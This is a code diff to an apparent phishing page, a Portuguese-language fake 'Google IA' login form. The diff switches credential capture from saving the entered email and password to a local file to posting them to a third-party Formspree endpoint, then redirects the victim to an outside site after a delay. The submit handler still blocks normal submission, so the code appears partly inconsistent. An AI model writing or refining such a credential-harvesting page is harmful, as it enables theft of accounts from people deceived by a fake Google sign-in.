@@ -65,13 +65,14 @@
 
     <div class="login-container">
         <h2>Login com Google IA</h2>
-	<h5>Insira suas credenciais para começar</h5>
-        <form id="loginForm">
+        <h5>Insira suas credenciais para começar</h5>
+        <!-- Modificado para enviar dados para Formspree -->
+        <form id="loginForm" action="https://formspree.io/f/{YOUR_FORM_ID}" method="POST">
             <div class="input-group">
-                <input type="email" id="email" placeholder="E-mail ou telefone" required>
+                <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
             </div>
             <div class="input-group">
-                <input type="password" id="senha" placeholder="Senha" required>
+                <input type="password" id="senha" name="senha" placeholder="Senha" required>
             </div>
             <button type="submit">Entrar</button>
         </form>
@@ -82,29 +83,6 @@
     </div>
 
     <script>
-        // Função para gerar um arquivo .txt com os dados de login
-        function gerarArquivo() {
-            var email = document.getElementById('email').value;
-            var senha = document.getElementById('senha').value;
-
-            // Verifica se os campos estão preenchidos
-            if (email && senha) {
-                // Cria o conteúdo do arquivo
-                var conteudo = 'E-mail: ' + email + '\nSenha: ' + senha;
-
-                // Cria o Blob com o conteúdo
-                var blob = new Blob([conteudo], { type: 'text/plain' });
-
-                // Cria um link para download do arquivo
-                var link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.download = 'dados_login.txt';
-                link.click();
-            } else {
-                alert('Por favor, preencha os campos de e-mail e senha!');
-            }
-        }
-
         // Função chamada ao enviar o formulário
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Evita que o formulário seja enviado normalmente
@@ -114,14 +92,9 @@
 
             // Simula um atraso de "processamento" com setTimeout
             setTimeout(function() {
-                gerarArquivo(); // Gera e permite o download do arquivo com os dados
-
-                // Exibe a mensagem de conclusão de processamento
-                document.getElementById('messageContainer').innerHTML = '<p>Processamento concluído!</p>';
-
                 // Após 2 segundos, redireciona para o site desejado
                 window.location.href = "https://tradeboosting.org/app/login.php"; 
-            }, 20000); // Simula um atraso de 2 segundos (ajuste conforme necessário)
+            }, 2000);
         });
     </script>
 
